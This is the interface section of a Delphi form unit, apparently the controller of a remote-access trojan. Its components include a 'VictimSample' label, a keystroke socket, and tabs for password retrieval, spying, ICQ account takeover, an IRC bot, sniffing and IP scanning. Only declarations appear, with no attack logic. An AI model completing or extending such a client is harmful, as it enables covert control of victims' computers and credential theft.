unit MainUnit;

interface
  
uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  uOutBar, ExtCtrls, OutlookBtn, StdCtrls, ComCtrls,
  Gauges, Menus, ImgList, MainColors, TFlatComboBoxUnit, RXCtrls,
  Parole, TFlatCheckBoxUnit, TFlatEditUnit,
  TFlatHintUnit, TFlatSpeedButtonUnit,{ siFltBtn,} {Butonel,}
  ScktComp, TFlatRadioButtonUnit, TFlatMemoUnit, NMMsg,
  RXShell, Animate, FileCtrl, jpeg, DFSStatusBar, RXSlider,
  RXCombos, RXSpin, Ping, TFlatProgressBarUnit, WSocket, TB97Ctls, OleCtrls, ACTIVEVOICEPROJECTLib_TLB,
  ZLIBArchive, RxGIF, {GIFImage,} kbShellDialogs,inifiles;

type
  TMainForm = class(TForm)
    Panel1: TPanel;
    OutBar: TOutBar;
    PopupMenu1: TPopupMenu;
    miAddPage: TMenuItem;
    miChangePage: TMenuItem;
    miChangeItem: TMenuItem;
    miDeletePage: TMenuItem;
    N1: TMenuItem;
    N2: TMenuItem;
    CaptionLabel: TLabel;
    Imagini: TImageList;
    N3: TMenuItem;
    savesettings1: TMenuItem;
    loadsettings1: TMenuItem;
    OpenSettings: TOpenDialog;
    SaveSettings: TSaveDialog;
    PickColor: TColorDialog;
    Panel3: TPanel;
    _Pagini: TPageControl;
    pFirst: TTabSheet;
    pColorz: TTabSheet;
    winCombo: TFlatComboBox;
    Shape7: TShape;
    winLabel: TLabel;
    Shape8: TShape;
    menLabel: TLabel;
    menCombo: TFlatComboBox;
    Label2: TLabel;
    InfoMemo: TMemo;
    StatusBar: TDFSStatusBar;
    Shape3: TShape;
    Shape4: TShape;
    Status: TLabel;
    ConnectPanel: TPanel;
    Label4: TLabel;
    Label5: TLabel;
    ConnectButton: TOutlookBtn;
    portEdit: TFlatEdit;
    Shape6: TShape;
    AniTimer: TTimer;
    Image1: TImage;
    FlatHint: TFlatHint;
    CloseButton: TFlatSpeedButton;
    MinimizeButton: TFlatSpeedButton;
    ShortcutButton: TLabel;
    pKeyboard: TTabSheet;
    OutlookBtn1: TOutlookBtn;
    OutlookBtn6: TOutlookBtn;
    OutlookBtn7: TOutlookBtn;
    OutlookBtn10: TOutlookBtn;
    ClientSocket: TClientSocket;
    progr: TGauge;
    pGetMoreInfo: TTabSheet;
    _InfoLabel: TLabel;
    InfoLabel: TLabel;
    OutlookBtn5: TOutlookBtn;
    OutlookBtn9: TOutlookBtn;
    hidMemo: TMemo;
    pServerOptions: TTabSheet;
    OutlookBtn11: TOutlookBtn;
    OutlookBtn12: TOutlookBtn;
    OutlookBtn13: TOutlookBtn;
    OutlookBtn14: TOutlookBtn;
    OutlookBtn15: TOutlookBtn;
    OutlookBtn16: TOutlookBtn;
    OutlookBtn17: TOutlookBtn;
    OutlookBtn18: TOutlookBtn;
    pNotify: TTabSheet;
    FlatEdit1: TFlatEdit;
    Label7: TLabel;
    Label8: TLabel;
    FlatEdit2: TFlatEdit;
    Label10: TLabel;
    OutlookBtn19: TOutlookBtn;
    OutlookBtn20: TOutlookBtn;
    Label6: TLabel;
    OutlookBtn21: TOutlookBtn;
    OutlookBtn22: TOutlookBtn;
    FlatEdit3: TFlatEdit;
    Label9: TLabel;
    FlatEdit4: TFlatEdit;
    Label11: TLabel;
    Label12: TLabel;
    FlatEdit5: TFlatEdit;
    Label13: TLabel;
    OutlookBtn23: TOutlookBtn;
    OutlookBtn24: TOutlookBtn;
    FlatEdit6: TFlatEdit;
    Label14: TLabel;
    Label15: TLabel;
    FlatEdit7: TFlatEdit;
    FlatEdit8: TFlatEdit;
    Label16: TLabel;
    Shape10: TShape;
    Shape11: TShape;
    Shape12: TShape;
    pMsgManager: TTabSheet;
    keysock: TClientSocket;
    OutlookBtn8: TOutlookBtn;
    FlatSpeedButton1: TFlatSpeedButton;
    FlatSpeedButton2: TFlatSpeedButton;
    FlatSpeedButton3: TFlatSpeedButton;
    FlatSpeedButton4: TFlatSpeedButton;
    FlatSpeedButton5: TFlatSpeedButton;
    FlatRadioButton1: TFlatRadioButton;
    FlatRadioButton2: TFlatRadioButton;
    FlatRadioButton3: TFlatRadioButton;
    FlatRadioButton4: TFlatRadioButton;
    FlatRadioButton5: TFlatRadioButton;
    FlatRadioButton6: TFlatRadioButton;
    Label17: TLabel;
    Label18: TLabel;
    FlatEdit9: TFlatEdit;
    FlatEdit10: TFlatEdit;
    Label19: TLabel;
    Label20: TLabel;
    OutlookBtn25: TOutlookBtn;
    OutlookBtn26: TOutlookBtn;
    pChat: TTabSheet;
    Label21: TLabel;
    FlatEdit11: TFlatEdit;
    Label22: TLabel;
    Label23: TLabel;
    Label24: TLabel;
    Label25: TLabel;
    Shape13: TShape;
    FlatEdit12: TFlatEdit;
    Label26: TLabel;
    VictimSample: TLabel;
    Label28: TLabel;
    Label29: TLabel;
    Label30: TLabel;
    Label31: TLabel;
    Label32: TLabel;
    Shape14: TShape;
    Label33: TLabel;
    FlatEdit14: TFlatEdit;
    ClientSample: TLabel;
    Label35: TLabel;
    OutlookBtn27: TOutlookBtn;
    OutlookBtn28: TOutlookBtn;
    pFTP: TTabSheet;
    Label27: TLabel;
    FlatEdit15: TFlatEdit;
    FlatEdit17: TFlatEdit;
    FTPstatus: TLabel;
    OutlookBtn29: TOutlookBtn;
    OutlookBtn30: TOutlookBtn;
    ChatSock: TClientSocket;
    pFindFiles: TTabSheet;
    Label34: TLabel;
    FlatEdit19: TFlatEdit;
    Label36: TLabel;
    FlatEdit20: TFlatEdit;
    FlatCheckBox2: TFlatCheckBox;
    OutlookBtn31: TOutlookBtn;
    OutlookBtn32: TOutlookBtn;
    pPasswords: TTabSheet;
    OutlookBtn33: TOutlookBtn;
    OutlookBtn34: TOutlookBtn;
    OutlookBtn35: TOutlookBtn;
    OutlookBtn36: TOutlookBtn;
    Label37: TLabel;
    Label38: TLabel;
    pRegEdit: TTabSheet;
    OutlookBtn37: TOutlookBtn;
    pPrint: TTabSheet;
    Label39: TLabel;
    FlatSpeedButton6: TFlatSpeedButton;
    FlatSpeedButton7: TFlatSpeedButton;
    FlatSpeedButton8: TFlatSpeedButton;
    FlatSpeedButton9: TFlatSpeedButton;
    Label40: TLabel;
    OutlookBtn38: TOutlookBtn;
    PrintMemo: TMemo;
    pBrowser: TTabSheet;
    FlatEdit22: TFlatEdit;
    Label41: TLabel;
    OutlookBtn39: TOutlookBtn;
    pRes: TTabSheet;
    ResList: TListBox;
    Label42: TLabel;
    OutlookBtn40: TOutlookBtn;
    OutlookBtn41: TOutlookBtn;
    pColors: TTabSheet;
    Label43: TLabel;
    Shape15: TShape;
    Label44: TLabel;
    Shape16: TShape;
    Shape17: TShape;
    Label45: TLabel;
    Label46: TLabel;
    Label47: TLabel;
    Label48: TLabel;
    OutlookBtn42: TOutlookBtn;
    OutlookBtn43: TOutlookBtn;
    OutlookBtn44: TOutlookBtn;
    pRestart: TTabSheet;
    OutlookBtn45: TOutlookBtn;
    pMouse: TTabSheet;
    OutlookBtn46: TOutlookBtn;
    OutlookBtn47: TOutlookBtn;
    OutlookBtn48: TOutlookBtn;
    OutlookBtn49: TOutlookBtn;
    OutlookBtn50: TOutlookBtn;
    OutlookBtn51: TOutlookBtn;
    OutlookBtn52: TOutlookBtn;
    OutlookBtn53: TOutlookBtn;
    pSound: TTabSheet;
    Label49: TLabel;
    Label50: TLabel;
    OutlookBtn54: TOutlookBtn;
    OutlookBtn55: TOutlookBtn;
    pTimeDate: TTabSheet;
    Label51: TLabel;
    FlatEdit24: TFlatEdit;
    FlatComboBox1: TFlatComboBox;
    Label52: TLabel;
    FlatEdit25: TFlatEdit;
    OutlookBtn56: TOutlookBtn;
    OutlookBtn57: TOutlookBtn;
    OutlookBtn58: TOutlookBtn;
    pExtra: TTabSheet;
    Label53: TLabel;
    OutlookBtn59: TOutlookBtn;
    OutlookBtn60: TOutlookBtn;
    OutlookBtn61: TOutlookBtn;
    OutlookBtn62: TOutlookBtn;
    OutlookBtn63: TOutlookBtn;
    OutlookBtn64: TOutlookBtn;
    OutlookBtn65: TOutlookBtn;
    OutlookBtn66: TOutlookBtn;
    OutlookBtn67: TOutlookBtn;
    OutlookBtn68: TOutlookBtn;
    Label54: TLabel;
    OutlookBtn69: TOutlookBtn;
    OutlookBtn70: TOutlookBtn;
    OutlookBtn71: TOutlookBtn;
    OutlookBtn72: TOutlookBtn;
    OutlookBtn73: TOutlookBtn;
    OutlookBtn74: TOutlookBtn;
    OutlookBtn75: TOutlookBtn;
    OutlookBtn76: TOutlookBtn;
    OutlookBtn77: TOutlookBtn;
    OutlookBtn78: TOutlookBtn;
    TrayIcon: TRxTrayIcon;
    pSpy: TTabSheet;
    OutlookBtn79: TOutlookBtn;
    pSee: TTabSheet;
    OutlookBtn80: TOutlookBtn;
    OutlookBtn81: TOutlookBtn;
    OutlookBtn82: TOutlookBtn;
    pFlip: TTabSheet;
    FlatCheckBox3: TFlatCheckBox;
    FlatCheckBox4: TFlatCheckBox;
    OutlookBtn83: TOutlookBtn;
    Image2: TImage;
    Image3: TImage;
    pSendKeys: TTabSheet;
    ListBox1: TListBox;
    Label55: TLabel;
    Memo1: TMemo;
    Label56: TLabel;
    OutlookBtn84: TOutlookBtn;
    OutlookBtn85: TOutlookBtn;
    OutlookBtn86: TOutlookBtn;
    Label57: TLabel;
    Label58: TLabel;
    OutlookBtn87: TOutlookBtn;
    OutlookBtn88: TOutlookBtn;
    OutlookBtn89: TOutlookBtn;
    OutlookBtn90: TOutlookBtn;
    IPEdit: TFlatComboBox;
    pLocalFolder: TTabSheet;
    Label59: TLabel;
    Label60: TLabel;
    Label61: TLabel;
    pQuality: TTabSheet;
    Label62: TLabel;
    Label63: TLabel;
    Label64: TLabel;
    OutlookBtn93: TOutlookBtn;
    OpenBMP: TOpenDialog;
    pMisc: TTabSheet;
    OutlookBtn94: TOutlookBtn;
    FlatCheckBox1: TFlatCheckBox;
    Label66: TLabel;
    Label67: TLabel;
    Label68: TLabel;
    FlatCheckBox5: TFlatCheckBox;
    IdleLabel: TLabel;
    CancelButton: TFlatSpeedButton;
    Label69: TLabel;
    FlatCheckBox6: TFlatCheckBox;
    FlatCheckBox7: TFlatCheckBox;
    pScreenSaver: TTabSheet;
    FlatEdit26: TFlatEdit;
    Label70: TLabel;
    FlatComboBox2: TFlatComboBox;
    Label71: TLabel;
    RxSlider1: TRxSlider;
    FlatCheckBox8: TFlatCheckBox;
    FlatCheckBox9: TFlatCheckBox;
    FlatCheckBox10: TFlatCheckBox;
    FlatCheckBox11: TFlatCheckBox;
    Label72: TLabel;
    Label73: TLabel;
    FlatRadioButton7: TFlatRadioButton;
    FlatRadioButton8: TFlatRadioButton;
    OutlookBtn96: TOutlookBtn;
    OutlookBtn97: TOutlookBtn;
    Label74: TLabel;
    Label75: TLabel;
    SSText: TLabel;
    Shape18: TShape;
    SSBack: TLabel;
    Shape19: TShape;
    OutlookBtn95: TOutlookBtn;
    FlatCheckBox12: TFlatCheckBox;
    FlatEdit13: TRxSpinEdit;
    FlatEdit16: TRxSpinEdit;
    FlatEdit18: TRxSpinEdit;
    FlatEdit21: TRxSpinEdit;
    FlatEdit23: TRxSpinEdit;
    FlatEdit27: TRxSpinEdit;
    TrackBar1: TRxSlider;
    TrackBar2: TRxSlider;
    TrackBar3: TRxSlider;
    pHomeInfo: TTabSheet;
    Label76: TLabel;
    Label77: TLabel;
    OutlookBtn98: TOutlookBtn;
    OutlookBtn99: TOutlookBtn;
    Label78: TLabel;
    OutlookBtn100: TOutlookBtn;
    OutlookBtn101: TOutlookBtn;
    Label79: TLabel;
    OutlookBtn102: TOutlookBtn;
    OutlookBtn103: TOutlookBtn;
    Label80: TLabel;
    OutlookBtn105: TOutlookBtn;
    OutlookBtn106: TOutlookBtn;
    SpySocket: TClientSocket;
    SpyMemo: TMemo;
    Label81: TLabel;
    OutlookBtn108: TOutlookBtn;
    OutlookBtn109: TOutlookBtn;
    Label82: TLabel;
    Label83: TLabel;
    OutlookBtn104: TOutlookBtn;
    OutlookBtn107: TOutlookBtn;
    RxSlider2: TRxSlider;
    Label84: TLabel;
    Label85: TLabel;
    RxWaveBar: TRxSlider;
    RxSynthBar: TRxSlider;
    RxCDBar: TRxSlider;
    OutlookBtn110: TOutlookBtn;
    OutlookBtn111: TOutlookBtn;
    OutlookBtn112: TOutlookBtn;
    OutlookBtn113: TOutlookBtn;
    pMatrix: TTabSheet;
    OutlookBtn114: TOutlookBtn;
    MatrixSock: TClientSocket;
    Memo2: TMemo;
    Label86: TLabel;
    pAdvanced: TTabSheet;
    Label87: TLabel;
    FlatEdit28: TFlatEdit;
    FlatEdit29: TFlatEdit;
    FlatEdit30: TFlatEdit;
    Label88: TLabel;
    FlatEdit31: TFlatEdit;
    Label89: TLabel;
    FlatCheckBox13: TFlatCheckBox;
    pAppRedirect: TTabSheet;
    OutlookBtn115: TOutlookBtn;
    FlatEdit33: TFlatEdit;
    Label90: TLabel;
    Label91: TLabel;
    Memo3: TMemo;
    OutlookBtn116: TOutlookBtn;
    pScanner: TTabSheet;
    OutlookBtn117: TOutlookBtn;
    ip1: TFlatEdit;
    ip2: TFlatEdit;
    ip3: TFlatEdit;
    ip4: TFlatEdit;
    eip1: TFlatEdit;
    eip2: TFlatEdit;
    eip3: TFlatEdit;
    eip4: TFlatEdit;
    Label92: TLabel;
    Label93: TLabel;
    FlatEdit32: TFlatEdit;
    Label94: TLabel;
    Shape20: TShape;
    huntb: TOutlookBtn;
    abortb: TOutlookBtn;
    Memo4: TMemo;
    hunt1: TWSocket;
    RxSpinEdit1: TRxSpinEdit;
    Timer1: TTimer;
    pb: TGauge;
    OpenServer: TOpenDialog;
    OutlookBtn118: TOutlookBtn;
    TimeOut: TTimer;
    Label95: TLabel;
    ToolbarButton971: TToolbarButton97;
    FlatEdit34: TFlatEdit;
    pPortRedirect: TTabSheet;
    Label96: TLabel;
    PortList: TListView;
    OutlookBtn119: TOutlookBtn;
    OutlookBtn120: TOutlookBtn;
    OutlookBtn121: TOutlookBtn;
    pICQTakeover: TTabSheet;
    Label97: TLabel;
    ICQList: TListView;
    OutlookBtn122: TOutlookBtn;
    OutlookBtn123: TOutlookBtn;
    Label98: TLabel;
    OutlookBtn124: TOutlookBtn;
    pSpeech: TTabSheet;
    Label99: TLabel;
    SpeechMemo: TMemo;
    Label100: TLabel;
    OutlookBtn125: TOutlookBtn;
    OutlookBtn126: TOutlookBtn;
    OutlookBtn127: TOutlookBtn;
    zip: TZLBArchive;
    pClipboard: TTabSheet;
    Label101: TLabel;
    Memo5: TMemo;
    OutlookBtn128: TOutlookBtn;
    OutlookBtn129: TOutlookBtn;
    OutlookBtn130: TOutlookBtn;
    OutlookBtn131: TOutlookBtn;
    IPToolButton: TFlatSpeedButton;
    TrayPop: TPopupMenu;
    restore1: TMenuItem;
    N4: TMenuItem;
    checkforupdates1: TMenuItem;
    exit1: TMenuItem;
    help1: TMenuItem;
    www1: TMenuItem;
    N5: TMenuItem;
    Label102: TLabel;
    pIRCBot: TTabSheet;
    Label103: TLabel;
    FlatEdit35: TFlatEdit;
    FlatEdit36: TFlatEdit;
    FlatEdit37: TFlatEdit;
    FlatEdit38: TFlatEdit;
    Label105: TLabel;
    Label104: TLabel;
    BotCommands: TMemo;
    Label106: TLabel;
    OutlookBtn132: TOutlookBtn;
    Label107: TLabel;
    OutlookBtn133: TOutlookBtn;
    OutlookBtn134: TOutlookBtn;
    OutlookBtn135: TOutlookBtn;
    OutlookBtn136: TOutlookBtn;
    FlatCheckBox14: TFlatCheckBox;
    FlatEdit39: TFlatEdit;
    SaveBOT: TSaveDialog;
    LoadBOT: TOpenDialog;
    OutlookBtn137: TOutlookBtn;
    Label108: TLabel;
    FlatEdit40: TFlatEdit;
    FlatEdit41: TFlatEdit;
    OutlookBtn138: TOutlookBtn;
    OutlookBtn139: TOutlookBtn;
    pSniff: TTabSheet;
    Label109: TLabel;
    OutlookBtn140: TOutlookBtn;
    OutlookBtn141: TOutlookBtn;
    Label110: TLabel;
    FlatComboBox3: TFlatComboBox;
    OutlookBtn142: TOutlookBtn;
    FlatRadioButton9: TFlatRadioButton;
    FlatRadioButton10: TFlatRadioButton;
    ListBox2: TListBox;
    OutlookBtn143: TOutlookBtn;
    OutlookBtn144: TOutlookBtn;
    FlatEdit42: TFlatEdit;
    OutlookBtn145: TOutlookBtn;
    SniffSock: TClientSocket;
    MainImg: TImage;
    ConnectBtn: TFlatSpeedButton;
    FlatSpeedButton10: TFlatSpeedButton;
    pSkins: TTabSheet;
    Label111: TLabel;
    ListBox3: TListBox;
    OutlookBtn146: TOutlookBtn;
    OutlookBtn147: TOutlookBtn;
    OutlookBtn148: TOutlookBtn;
    OutlookBtn149: TOutlookBtn;
    BrowseFolder: TkbBrowseForFolderDialog;
    Label3: TLabel;
    Label65: TLabel;
    Label112: TLabel;
    Shape1: TShape;
    FontDialog1: TFontDialog;
    Label113: TLabel;
    Shape2: TShape;
    Label114: TLabel;
    OutlookBtn3: TOutlookBtn;
    OutlookBtn4: TOutlookBtn;
    Label1: TLabel;
    Label115: TLabel;
    FlatEdit43: TFlatEdit;
    OutlookBtn150: TOutlookBtn;
    Label116: TLabel;
    OutlookBtn2: TOutlookBtn;
    OutlookBtn91: TOutlookBtn;
    procedure MenuChangeClick(Sender: TObject);
    procedure miDeletePageClick(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure miChangePageClick(Sender: TObject);
    procedure miChangeItemClick(Sender: TObject);
    procedure miAddPageClick(Sender: TObject);
    procedure OutlookBtn5Click(Sender: TObject);
    procedure OutBarClick(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure savesettings1Click(Sender: TObject);
    procedure loadsettings1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure SetTheColors;
    procedure winLabelClick(Sender: TObject);
    procedure menLabelClick(Sender: TObject);
    procedure winComboChange(Sender: TObject);
    procedure menComboChange(Sender: TObject);
    procedure MinimizeButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure AniTimerTimer(Sender: TObject);
    procedure ShortcutButtonClick(Sender: TObject);
    procedure OutlookBtn1Click(Sender: TObject);
    procedure ConnectButtonClick(Sender: TObject);
    procedure ClientSocketDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocketConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientSocketError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ClientSocketRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure OutlookBtn9Click(Sender: TObject);
    procedure OutlookBtn11Click(Sender: TObject);
    procedure OutlookBtn13Click(Sender: TObject);
    procedure OutlookBtn12Click(Sender: TObject);
    procedure OutlookBtn14Click(Sender: TObject);
    procedure OutlookBtn16Click(Sender: TObject);
    procedure OutlookBtn17Click(Sender: TObject);
    procedure OutlookBtn20Click(Sender: TObject);
    procedure OutlookBtn22Click(Sender: TObject);
    procedure OutlookBtn24Click(Sender: TObject);
    procedure OutlookBtn19Click(Sender: TObject);
    procedure OutlookBtn21Click(Sender: TObject);
    procedure OutlookBtn23Click(Sender: TObject);
    procedure keysockRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure OutlookBtn6Click(Sender: TObject);
    procedure OutlookBtn10Click(Sender: TObject);
    procedure OutlookBtn25Click(Sender: TObject);
    procedure OutlookBtn26Click(Sender: TObject);
    procedure Label25Click(Sender: TObject);
    procedure Label32Click(Sender: TObject);
    procedure FlatEdit12Change(Sender: TObject);
    procedure FlatEdit14Change(Sender: TObject);
    procedure pFTPEnter(Sender: TObject);
    procedure OutlookBtn30Click(Sender: TObject);
    procedure OutlookBtn29Click(Sender: TObject);
    procedure OutlookBtn28Click(Sender: TObject);
    procedure OutlookBtn27Click(Sender: TObject);
    procedure ChatSockDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ChatSockError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ChatSockRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure pChatShow(Sender: TObject);
    procedure OutlookBtn31Click(Sender: TObject);
    procedure OutlookBtn32Click(Sender: TObject);
    procedure OutlookBtn33Click(Sender: TObject);
    procedure OutlookBtn35Click(Sender: TObject);
    procedure OutlookBtn34Click(Sender: TObject);
    procedure OutlookBtn36Click(Sender: TObject);
    procedure OutlookBtn37Click(Sender: TObject);
    procedure FlatSpeedButton6Click(Sender: TObject);
    procedure FlatSpeedButton7Click(Sender: TObject);
    procedure FlatSpeedButton8Click(Sender: TObject);
    procedure FlatSpeedButton9Click(Sender: TObject);
    procedure FlatEdit21Change(Sender: TObject);
    procedure OutlookBtn38Click(Sender: TObject);
    procedure OutlookBtn39Click(Sender: TObject);
    procedure OutlookBtn40Click(Sender: TObject);
    procedure OutlookBtn41Click(Sender: TObject);
    procedure Label43Click(Sender: TObject);
    procedure OutlookBtn44Click(Sender: TObject);
    procedure Label44Click(Sender: TObject);
    procedure Label45Click(Sender: TObject);
    procedure OutlookBtn43Click(Sender: TObject);
    procedure OutlookBtn42Click(Sender: TObject);
    procedure OutlookBtn45Click(Sender: TObject);
    procedure OutlookBtn52Click(Sender: TObject);
    procedure OutlookBtn46Click(Sender: TObject);
    procedure OutlookBtn47Click(Sender: TObject);
    procedure OutlookBtn48Click(Sender: TObject);
    procedure OutlookBtn51Click(Sender: TObject);
    procedure OutlookBtn50Click(Sender: TObject);
    procedure OutlookBtn53Click(Sender: TObject);
    procedure OutlookBtn49Click(Sender: TObject);
    procedure OutlookBtn54Click(Sender: TObject);
    procedure OutlookBtn55Click(Sender: TObject);
    procedure OutlookBtn56Click(Sender: TObject);
    procedure OutlookBtn57Click(Sender: TObject);
    procedure OutlookBtn58Click(Sender: TObject);
    procedure OutlookBtn59Click(Sender: TObject);
    procedure OutlookBtn64Click(Sender: TObject);
    procedure OutlookBtn60Click(Sender: TObject);
    procedure OutlookBtn65Click(Sender: TObject);
    procedure OutlookBtn61Click(Sender: TObject);
    procedure OutlookBtn66Click(Sender: TObject);
    procedure OutlookBtn62Click(Sender: TObject);
    procedure OutlookBtn67Click(Sender: TObject);
    procedure OutlookBtn63Click(Sender: TObject);
    procedure OutlookBtn68Click(Sender: TObject);
    procedure OutlookBtn77Click(Sender: TObject);
    procedure OutlookBtn78Click(Sender: TObject);
    procedure OutlookBtn76Click(Sender: TObject);
    procedure OutlookBtn75Click(Sender: TObject);
    procedure OutlookBtn73Click(Sender: TObject);
    procedure OutlookBtn72Click(Sender: TObject);
    procedure OutlookBtn74Click(Sender: TObject);
    procedure OutlookBtn71Click(Sender: TObject);
    procedure OutlookBtn69Click(Sender: TObject);
    procedure OutlookBtn70Click(Sender: TObject);
    procedure TrayIconClick(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure OutlookBtn79Click(Sender: TObject);
    procedure OutlookBtn80Click(Sender: TObject);
    procedure OutlookBtn81Click(Sender: TObject);
    procedure OutlookBtn83Click(Sender: TObject);
    procedure OutlookBtn82Click(Sender: TObject);
    procedure OutlookBtn7Click(Sender: TObject);
    procedure OutlookBtn85Click(Sender: TObject);
    procedure Memo1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure Memo1KeyPress(Sender: TObject; var Key: Char);
    procedure Memo1KeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure OutlookBtn84Click(Sender: TObject);
    procedure OutlookBtn86Click(Sender: TObject);
    procedure OutlookBtn15Click(Sender: TObject);
    procedure OutlookBtn87Click(Sender: TObject);
    procedure OutlookBtn88Click(Sender: TObject);
    procedure OutlookBtn89Click(Sender: TObject);
    procedure OutlookBtn90Click(Sender: TObject);
    procedure OutlookBtn18Click(Sender: TObject);
    procedure IPEditChange(Sender: TObject);
    procedure pLocalFolderEnter(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure pPrintShow(Sender: TObject);
    procedure Image4Click(Sender: TObject);
    procedure Image1Click(Sender: TObject);
    procedure OutlookBtn93Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure OutlookBtn94Click(Sender: TObject);
    procedure FlatCheckBox1Click(Sender: TObject);
    procedure pMiscHide(Sender: TObject);
    procedure CancelButtonClick(Sender: TObject);
    procedure FlatCheckBox6MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure pMiscEnter(Sender: TObject);
    procedure SSTextClick(Sender: TObject);
    procedure SSBackClick(Sender: TObject);
    procedure OutlookBtn96Click(Sender: TObject);
    procedure OutlookBtn97Click(Sender: TObject);
    procedure OutlookBtn95Click(Sender: TObject);
    procedure OutlookBtn99Click(Sender: TObject);
    procedure OutlookBtn98Click(Sender: TObject);
    procedure SpySocketRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure OutlookBtn100Click(Sender: TObject);
    procedure OutlookBtn101Click(Sender: TObject);
    procedure OutlookBtn102Click(Sender: TObject);
    procedure OutlookBtn105Click(Sender: TObject);
    procedure OutlookBtn103Click(Sender: TObject);
    procedure OutlookBtn106Click(Sender: TObject);
    procedure OutlookBtn108Click(Sender: TObject);
    procedure OutlookBtn109Click(Sender: TObject);
    procedure OutlookBtn104Click(Sender: TObject);
    procedure OutlookBtn107Click(Sender: TObject);
    procedure RxSlider2Change(Sender: TObject);
    procedure OutlookBtn113Click(Sender: TObject);
    procedure OutlookBtn110Click(Sender: TObject);
    procedure OutlookBtn111Click(Sender: TObject);
    procedure OutlookBtn112Click(Sender: TObject);
    procedure OutlookBtn114Click(Sender: TObject);
    procedure MatrixSockRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure FlatEdit28Change(Sender: TObject);
    procedure FlatEdit29Change(Sender: TObject);
    procedure FlatEdit30Change(Sender: TObject);
    procedure SpySocketDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure FlatEdit16Change(Sender: TObject);
    procedure FlatEdit17Change(Sender: TObject);
    procedure OutlookBtn8Click(Sender: TObject);
    procedure FlatCheckBox13Click(Sender: TObject);
    procedure OutlookBtn115Click(Sender: TObject);
    procedure OutlookBtn116Click(Sender: TObject);
    procedure OutlookBtn117Click(Sender: TObject);
    procedure hunt1DataAvailable(Sender: TObject; Error: Word);
    procedure huntbClick(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure abortbClick(Sender: TObject);
    procedure OutlookBtn118Click(Sender: TObject);
    procedure TimeOutTimer(Sender: TObject);
    procedure FlatEdit11Change(Sender: TObject);
    procedure ToolbarButton971Click(Sender: TObject);
    procedure OutlookBtn121Click(Sender: TObject);
    procedure OutlookBtn119Click(Sender: TObject);
    procedure OutlookBtn120Click(Sender: TObject);
    procedure OutlookBtn122Click(Sender: TObject);
    procedure OutlookBtn123Click(Sender: TObject);
    procedure OutlookBtn124Click(Sender: TObject);
    procedure OutlookBtn127Click(Sender: TObject);
    procedure OutlookBtn128Click(Sender: TObject);
    procedure OutlookBtn129Click(Sender: TObject);
    procedure OutlookBtn130Click(Sender: TObject);
    procedure IPToolButtonClick(Sender: TObject);
    procedure ip1Change(Sender: TObject);
    procedure ip2Change(Sender: TObject);
    procedure ip3Change(Sender: TObject);
    procedure OutlookBtn131Click(Sender: TObject);
    procedure OutlookBtn125Click(Sender: TObject);
    procedure OutlookBtn126Click(Sender: TObject);
    procedure SpySocketConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure restore1Click(Sender: TObject);
    procedure help1Click(Sender: TObject);
    procedure www1Click(Sender: TObject);
    procedure portEditKeyPress(Sender: TObject; var Key: Char);
    procedure OutlookBtn133Click(Sender: TObject);
    procedure OutlookBtn132Click(Sender: TObject);
    procedure OutlookBtn134Click(Sender: TObject);
    procedure OutlookBtn135Click(Sender: TObject);
    procedure OutlookBtn136Click(Sender: TObject);
    procedure OutlookBtn137Click(Sender: TObject);
    procedure ToolbarButton971MouseDown(Sender: TObject;
      Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
    procedure hunt1DnsLookupDone(Sender: TObject; Error: Word);
    procedure OutlookBtn138Click(Sender: TObject);
    procedure OutlookBtn139Click(Sender: TObject);
    procedure OutlookBtn140Click(Sender: TObject);
    procedure OutlookBtn142Click(Sender: TObject);
    procedure FlatComboBox3KeyPress(Sender: TObject; var Key: Char);
    procedure OutlookBtn143Click(Sender: TObject);
    procedure OutlookBtn144Click(Sender: TObject);
    procedure OutlookBtn141Click(Sender: TObject);
    procedure OutlookBtn145Click(Sender: TObject);
    procedure SniffSockError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure SniffSockRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure FormPaint(Sender: TObject);
    procedure OutlookBtn148Click(Sender: TObject);
    procedure OutlookBtn147Click(Sender: TObject);
    procedure OutlookBtn149Click(Sender: TObject);
    procedure OutlookBtn2Click(Sender: TObject);
    procedure OutlookBtn3Click(Sender: TObject);
    procedure pColorzEnter(Sender: TObject);
    procedure Label112Click(Sender: TObject);
    procedure Label113Click(Sender: TObject);
    procedure OutlookBtn150Click(Sender: TObject);
    procedure OutlookBtn4Click(Sender: TObject);
    procedure pSkinsShow(Sender: TObject);
    procedure OutlookBtn146Click(Sender: TObject);
